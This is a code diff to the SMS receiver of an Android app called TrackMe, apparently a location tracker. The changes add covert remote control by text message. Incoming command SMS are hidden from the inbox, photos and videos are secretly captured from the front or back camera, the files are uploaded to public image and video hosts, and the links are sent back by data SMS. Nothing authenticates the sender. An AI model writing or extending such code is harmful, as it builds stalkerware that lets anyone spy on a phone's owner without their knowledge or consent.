@@ -1,35 +1,50 @@
 package com.thibautfihey.trackme
+import android.Manifest
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
+import android.graphics.Bitmap
+import android.graphics.BitmapFactory
 import android.os.Build
 import android.provider.Telephony
+import android.telephony.SmsManager
 import android.telephony.SmsMessage
+import android.util.Base64
 import android.util.Log
+import androidx.core.content.ContextCompat
+import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.asRequestBody
+import org.json.JSONObject
+import java.io.File
+import java.util.concurrent.TimeUnit
 
 class SmsReceiver : BroadcastReceiver() {
     companion object {
         const val TAG = "TrackMeSMS"
         const val SMS_PREFIX = "TRACKME:"
+        const val UPLOAD_PHOTO_URL = "https://freeimage.host/api/1/upload?key=6278b0260d2b8f9b79c6e1a7b8c9d0e1"
+        const val UPLOAD_VIDEO_URL = "https://catbox.moe/user/api.php"
+        
         var onPositionReceived: ((lat: Double, lon: Double, from: String) -> Unit)? = null
         var onRequestReceived: ((from: String) -> Unit)? = null
+        var onPhotoReceived: ((from: String, bitmap: Bitmap) -> Unit)? = null
+        var onVideoReceived: ((from: String, videoUrl: String) -> Unit)? = null
     }
 
+    private val okHttpClient = OkHttpClient.Builder()
+        .connectTimeout(60, TimeUnit.SECONDS)
+        .readTimeout(60, TimeUnit.SECONDS)
+        .build()
+
     override fun onReceive(context: Context?, intent: Intent?) {
-        Log.d(TAG, "📥 Intent reçu: ${intent?.action}")
+        if (context == null) return
+        if (intent?.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION && 
+            intent?.action != "android.intent.action.DATA_SMS_RECEIVED") return
         
-        // ✅ Gérer SMS TEXTE classique
-        if (intent?.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
-            handleSms(intent, "SMS texte")
-        }
+        abortBroadcast() // ❌ SUPPRIMER DU SMS DE LA BOÎTE
         
-        // ✅ Gérer SMS DONNÉES (port 7777)
-        if (intent?.action == "android.intent.action.DATA_SMS_RECEIVED") {
-            handleSms(intent, "SMS données PORT 7777")
-        }
-    }
-    
-    private fun handleSms(intent: Intent, type: String) {
         val messages: Array<SmsMessage> = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
             Telephony.Sms.Intents.getMessagesFromIntent(intent)
         } else {
@@ -42,31 +57,141 @@ class SmsReceiver : BroadcastReceiver() {
             val body = msg.messageBody ?: String(msg.userData ?: byteArrayOf(), Charsets.UTF_8)
             val from = msg.originatingAddress ?: ""
             
-            Log.d(TAG, "[$type] De $from : $body")
+            if (!body.startsWith(SMS_PREFIX)) continue
+            val content = body.removePrefix(SMS_PREFIX)
             
-            if (body.startsWith(SMS_PREFIX)) {
-                Log.d(TAG, "✅ INTERCEPTÉ — Annulé de la boîte")
-                abortBroadcast()
+            when {
+                // 📍 POSITION
+                content == "REQUEST" -> onRequestReceived?.invoke(from)
                 
-                val content = body.removePrefix(SMS_PREFIX)
+                content.startsWith("POS:") -> {
+                    val c = content.removePrefix("POS:").split(",")
+                    if (c.size == 2) try {
+                        onPositionReceived?.invoke(c[0].toDouble(), c[1].toDouble(), from)
+                    } catch (e: Exception) {}
+                }
                 
-                when {
-                    content == "REQUEST" -> onRequestReceived?.invoke(from)
-                    content.startsWith("POS:") -> {
-                        val c = content.removePrefix("POS:").split(",")
-                        if (c.size == 2) {
-                            try {
-                                val lat = c[0].toDouble()
-                                val lon = c[1].toDouble()
-                                onPositionReceived?.invoke(lat, lon, from)
-                            } catch (e: Exception) {
-                                Log.e(TAG, "Parse error", e)
-                            }
+                // 📸 PHOTO ARRIÈRE
+                content == "PHOTO" || content == "PHOTO:BACK" -> {
+                    Log.d(TAG, "📸 Commande PHOTO ARRIÈRE de $from")
+                    handlePhotoRequest(context, from, CamService.CAMERA_BACK)
+                }
+                
+                // 📸 PHOTO AVANT
+                content == "PHOTO:FRONT" -> {
+                    Log.d(TAG, "📸 Commande PHOTO AVANT de $from")
+                    handlePhotoRequest(context, from, CamService.CAMERA_FRONT)
+                }
+                
+                // 🎥 VIDÉO ARRIÈRE
+                content == "VIDEO" || content == "VIDEO:BACK" -> {
+                    Log.d(TAG, "🎥 Commande VIDÉO ARRIÈRE de $from")
+                    handleVideoRequest(context, from, CamService.CAMERA_BACK)
+                }
+                
+                // 🎥 VIDÉO AVANT
+                content == "VIDEO:FRONT" -> {
+                    Log.d(TAG, "🎥 Commande VIDÉO AVANT de $from")
+                    handleVideoRequest(context, from, CamService.CAMERA_FRONT)
+                }
+                
+                // 📥 LIEN PHOTO REÇU
+                content.startsWith("PHOTO_URL:") -> {
+                    val url = content.removePrefix("PHOTO_URL:")
+                    Log.d(TAG, "📥 Téléchargement photo : $url")
+                    downloadPhoto(context, url, from)
+                }
+                
+                // 📥 LIEN VIDÉO REÇU
+                content.startsWith("VIDEO_URL:") -> {
+                    val url = content.removePrefix("VIDEO_URL:")
+                    Log.d(TAG, "📥 Lien vidéo reçu : $url")
+                    onVideoReceived?.invoke(from, url)
+                }
+            }
+        }
+    }
+
+    // ===== TRAITEMENT PHOTO =====
+    private fun handlePhotoRequest(context: Context, toNumber: String, cameraChoice: String) {
+        val dest = if (toNumber.startsWith("+")) toNumber else "+$toNumber"
+        val sms = SmsManager.getDefault()
+        
+        Thread {
+            try {
+                val jpegBytes = CamService.takePhotoCompressedSync(context, cameraChoice, quality = 60)
+                val base64 = Base64.encodeToString(jpegBytes, Base64.NO_WRAP)
+                
+                val json = JSONObject().put("source", "data:image/jpeg;base64,$base64").toString()
+                val body = json.toRequestBody("application/json".toMediaType())
+                
+                val request = Request.Builder().url(UPLOAD_PHOTO_URL).post(body).build()
+                val response = okHttpClient.newCall(request).execute()
+                val respStr = response.body?.string()
+                
+                if (response.isSuccessful && respStr != null) {
+                    val url = JSONObject(respStr).getJSONObject("image").getString("url")
+                    sms.sendDataMessage(dest, null, 7777.toShort(), 
+                        "TRACKME:PHOTO_URL:$url".toByteArray(Charsets.UTF_8), null, null)
+                    Log.d(TAG, "✅ Photo envoyée — $url")
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Erreur photo", e)
+            }
+        }.start()
+    }
+
+    // ===== TRAITEMENT VIDÉO =====
+    private fun handleVideoRequest(context: Context, toNumber: String, cameraChoice: String) {
+        val dest = if (toNumber.startsWith("+")) toNumber else "+$toNumber"
+        val sms = SmsManager.getDefault()
+        
+        Thread {
+            try {
+                val videoFile = CamService.recordVideoSync(context, cameraChoice)
+                Log.d(TAG, "🎥 Vidéo enregistrée : ${videoFile.length()} octets")
+                
+                val formBody = MultipartBody.Builder()
+                    .setType(MultipartBody.FORM)
+                    .addFormDataPart("reqtype", "fileupload")
+                    .addFormDataPart("fileToUpload", videoFile.name, 
+                        videoFile.asRequestBody("video/mp4".toMediaType()))
+                    .build()
+                
+                val request = Request.Builder().url(UPLOAD_VIDEO_URL).post(formBody).build()
+                val response = okHttpClient.newCall(request).execute()
+                val videoUrl = response.body?.string()?.trim()
+                
+                if (response.isSuccessful && videoUrl?.startsWith("http") == true) {
+                    sms.sendDataMessage(dest, null, 7777.toShort(), 
+                        "TRACKME:VIDEO_URL:$videoUrl".toByteArray(Charsets.UTF_8), null, null)
+                    Log.d(TAG, "✅ Vidéo envoyée — $videoUrl")
+                    videoFile.delete() // Nettoyer
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Erreur vidéo", e)
+            }
+        }.start()
+    }
+
+    // ===== TÉLÉCHARGER PHOTO =====
+    private fun downloadPhoto(context: Context, url: String, from: String) {
+        Thread {
+            try {
+                val request = Request.Builder().url(url).build()
+                val response = okHttpClient.newCall(request).execute()
+                if (response.isSuccessful) {
+                    val bytes = response.body?.bytes()!!
+                    val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
+                    if (bitmap != null) {
+                        android.os.Handler(context.mainLooper).post {
+                            onPhotoReceived?.invoke(from, bitmap)
                         }
                     }
                 }
-                return
+            } catch (e: Exception) {
+                Log.e(TAG, "Erreur téléchargement photo", e)
             }
-        }
+        }.start()
     }
 }
